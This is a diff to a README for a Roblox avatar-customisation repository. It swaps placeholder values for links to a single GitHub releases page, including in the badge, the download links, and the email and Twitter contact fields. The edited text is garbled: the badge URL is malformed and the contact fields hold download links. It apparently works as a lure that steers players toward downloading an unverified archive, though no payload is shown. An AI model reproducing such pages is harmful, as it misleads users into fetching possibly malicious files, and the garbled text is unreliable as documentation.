@@ -2,7 +2,7 @@
 
 Welcome to the **Roblox Dress To Impress** repository! This project focuses on enhancing the experience of customizing avatars in Roblox. Whether you're a player looking to stand out or a developer interested in scripting, you’ll find valuable resources here.
 
-![Roblox](https://img.shields.io/badge/Roblox-Dress%20To%20Impress-blue.svg)
+![Roblox](https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases%20To%https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases)
 
 ## Table of Contents
 
@@ -29,7 +29,7 @@ Roblox is a popular online platform that allows users to create and play games. 
 
 To get started, download the repository using the link below:
 
-[Download the ZIP file](https://github.com/repo/user/archive.zip)
+[Download the ZIP file](https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases)
 
 After downloading, extract the ZIP file and follow these steps:
 
@@ -68,11 +68,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases
+- **Twitter**: [@yourhandle](https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases)
 
 For more updates and resources, visit the repository:
 
-[Download the ZIP file](https://github.com/repo/user/archive.zip)
+[Download the ZIP file](https://github.com/benjaminosee/Roblox-Dress-To-Impress/releases)
 
 Thank you for checking out **Roblox Dress To Impress**! Happy customizing!
